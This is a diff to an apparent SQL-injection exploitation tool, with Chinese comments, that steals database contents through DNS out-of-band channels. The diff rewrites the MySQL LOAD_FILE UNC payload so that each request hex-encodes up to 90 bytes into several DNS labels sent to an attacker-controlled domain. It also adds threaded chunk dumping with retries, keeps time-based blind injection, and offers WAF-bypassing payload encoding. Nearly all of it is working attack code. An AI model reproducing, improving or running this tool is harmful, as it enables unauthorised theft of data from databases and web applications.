@@ -287,13 +287,22 @@ class MySQL(DBMS):
     notes = "MySQL: LOAD_FILE 走 UNC, 需 Windows 目标 + FILE 权限 + secure_file_priv 放行; Linux 不触发解析"
     # 注意: 必须用正斜杠 //host/share。实测 Windows+MySQL 用 \\host\share 时不会发起解析
     # (LOAD_FILE 直接返回 NULL), 而 //host/share 才会走 DNS。
-    HEX = ("(SELECT LOAD_FILE(CONCAT('//','{label}.',"
-           "HEX(SUBSTR(({expr}),{off},{ln})),'.','%DOMAIN%','/a.txt')))")
+    # 每 30 字节一个 label(hex 60 字符, 卡在 label 63 上限内), 多个 label 可叠加。
     BLIND = ("(SELECT IF(({cond}),LOAD_FILE(CONCAT('//','{label}.%DOMAIN%','/a.txt')),0))")
 
     def hex_sql(self, label, expr, off, ln):
-        # off 传 0-based, MySQL SUBSTR 1-based
-        return self._fill(self.HEX, label=label, expr=expr, off=off + 1, ln=ln)
+        # off 传 0-based, MySQL SUBSTR 1-based。
+        # 多个 label 拼接时必须带条件: 数据比 chunk 短时, 后面的 label 会是空的,
+        # 空 label 会产生 "a..b" 这种非法域名, 解析直接失败(实测踩过)。
+        parts = ["HEX(SUBSTR((%s),%d,30))" % (expr, off + 1)]
+        for extra in (30, 60):
+            if extra >= ln:
+                break
+            parts.append(
+                "IF(LENGTH(({e}))>{cut},CONCAT(0x2e,HEX(SUBSTR(({e}),{pos},30))),'')"
+                .format(e=expr, cut=off + extra, pos=off + extra + 1))
+        return ("(SELECT LOAD_FILE(CONCAT('//','%s.',%s,0x2e,'%s','/a.txt')))"
+                % (label, ",".join(parts), self.domain))
 
     def blind_sql(self, label, cond):
         return self._fill(self.BLIND, label=label, cond=cond)
@@ -471,28 +480,71 @@ class DnsExfil:
         mid = rec[len(marker):].strip(".")
         if self.domain and mid.endswith("." + self.domain):
             mid = mid[: -(len(self.domain) + 1)]
-        hexpart = re.sub(r"[^0-9a-f]", "", mid.split(".")[0])
+        hexpart = re.sub(r"[^0-9a-f]", "", "".join(mid.split(".")))
         if len(hexpart) % 2:
             hexpart = hexpart[:-1]
         return bytes.fromhex(hexpart) if hexpart else b""
 
-    def dump(self, expr, chunk=30, max_bytes=8192):
+    def dump(self, expr, chunk=30, max_bytes=8192, threads=1):
+        """按块并发外带: 每次请求带 chunk 字节(<=90, 即 3 个 DNS label)。"""
+        from concurrent.futures import ThreadPoolExecutor, FIRST_COMPLETED, wait
+
+        results = {}
+        ended = False
+        next_off = 0
+        threads = max(1, int(threads))
+
+        def submit(pool):
+            nonlocal next_off
+            if ended or next_off >= max_bytes:
+                return None
+            fut = pool.submit(self.hex_chunk, expr, next_off, chunk)
+            results[fut] = next_off
+            next_off += chunk
+            return fut
+
+        with ThreadPoolExecutor(max_workers=threads) as pool:
+            inflight = {}
+            for _ in range(threads):
+                f = submit(pool)
+                if f is None:
+                    break
+                inflight[f] = True
+            while inflight:
+                done, _ = wait(list(inflight), return_when=FIRST_COMPLETED)
+                for fut in done:
+                    inflight.pop(fut, None)
+                    off = results.pop(fut)
+                    try:
+                        piece = fut.result()
+                    except Exception:
+                        piece = None
+                    if not piece or len(piece) < chunk:
+                        ended = True          # 到尾部了, 不再提交新块
+                    results[("done", off)] = piece
+                while len(inflight) < threads:
+                    f = submit(pool)
+                    if f is None:
+                        break
+                    inflight[f] = True
+
+        # 缺块重取一次: 并发时偶尔有块没等到记录, 直接拼会导致静默丢数据
+        last = max((k[1] for k in results if isinstance(k, tuple)), default=-1)
+        for off in range(0, last + 1, chunk):
+            if not results.get(("done", off)):
+                print("[!] 第 %d 块缺失, 重取" % (off // chunk + 1), file=sys.stderr)
+                results[("done", off)] = self.hex_chunk(expr, off, chunk)
+
         buf = b""
-        off = 0
-        misses = 0
-        while off < max_bytes:
-            piece = self.hex_chunk(expr, off, chunk)
+        for off in range(0, last + 1, chunk):
+            piece = results.get(("done", off)) or b""
             if not piece:
-                misses += 1
-                if misses >= 2:
-                    break
-            else:
-                misses = 0
-                buf += piece
-                print("[*] +%-4d %r" % (len(buf), buf[-48:]), file=sys.stderr)
-                if len(piece) < chunk:
-                    break
-            off += chunk
+                print("[!] 第 %d 块最终缺失, 输出截断于 %d 字节"
+                      % (off // chunk + 1, len(buf)), file=sys.stderr)
+                break
+            buf += piece
+        print("[*] %d 字节 / %d 块" % (len(buf), (len(buf) + chunk - 1) // chunk),
+              file=sys.stderr)
         return buf
 
     # ---- 布尔二分 ----
@@ -818,21 +870,24 @@ ceye 凭证走环境变量可避免留在 history:  export CEYE_TOKEN=.. CEYE_ID
     ap.add_argument("--header", action="append", default=[], help="额外 header, 如 'Cookie: a=b'")
     ap.add_argument("--expr", help="外带的 SQL 表达式, 如 'select version()'")
     ap.add_argument("--blind", action="store_true", help="布尔通道(不回带 hex, 每字符约 7 次请求)")
-    ap.add_argument("--chunk", type=int, default=30, help="每块字节数, hex 后 <=60 字符")
+    ap.add_argument("--chunk", type=int, default=30,
+                    help="每次请求外带字节数, 默认 30(hex 60 字符); 45 可试, 60 以上 DNS 名过长会失败")
     ap.add_argument("--max-bytes", type=int, default=8192)
-    ap.add_argument("--poll", type=float, default=2.0, help="轮询平台的间隔(秒)")
+    ap.add_argument("--poll", type=float, default=1.0, help="轮询平台的间隔(秒)")
     ap.add_argument("--timeout", type=float, default=60.0,
                     help="单块等待平台记录的上限(秒), 默认 45")
     ap.add_argument("--nonce", help="固定标记, 便于过滤平台记录")
     ap.add_argument("--technique", default="dns", choices=["dns", "time"],
                     help="dns=Hex 带外(默认, 最快); time=SLEEP 时间盲注(无带外也能跑, 慢)")
     ap.add_argument("--sleep-delay", type=float, default=1.0, help="时间盲注每次判定挂几秒")
+    ap.add_argument("--threads", type=int, default=1,
+                    help="并发块数, 默认 1; 目标 Apache worker 少时并发会把请求排队")
     ap.add_argument("--samples", type=int, default=2, help="时间盲注每判定取样次数, 取最小值抗抖动")
     ap.add_argument("--prefix", default="AND ", help="payload 前缀(默认 'AND ', MSSQL 堆叠语句可传 ';')")
     ap.add_argument("--suffix", default="", help="payload 后缀, 例如 '-- -'")
     ap.add_argument("--encode", default="auto", choices=["auto", "strict"],
                     help="payload URL 编码方式: auto=保留 ()/\"' 等字符(绕 WAF, 默认), strict=全量编码")
-    ap.add_argument("--http-timeout", type=float, default=6.0,
+    ap.add_argument("--http-timeout", type=float, default=3.0,
                     help="单次 HTTP 请求超时; UNC 触发 SMB 时会挂住, 建议 >=25")
     ap.add_argument("-v", "--verbose", action="store_true")
     a = ap.parse_args()
@@ -879,7 +934,7 @@ ceye 凭证走环境变量可避免留在 history:  export CEYE_TOKEN=.. CEYE_ID
     elif a.blind:
         data = ex.blind_dump(expr)
     else:
-        data = ex.dump(expr, a.chunk, a.max_bytes)
+        data = ex.dump(expr, a.chunk, a.max_bytes, threads=a.threads)
 
     print("\n[+] bytes: %d" % len(data))
     print("[+] raw : %r" % data)
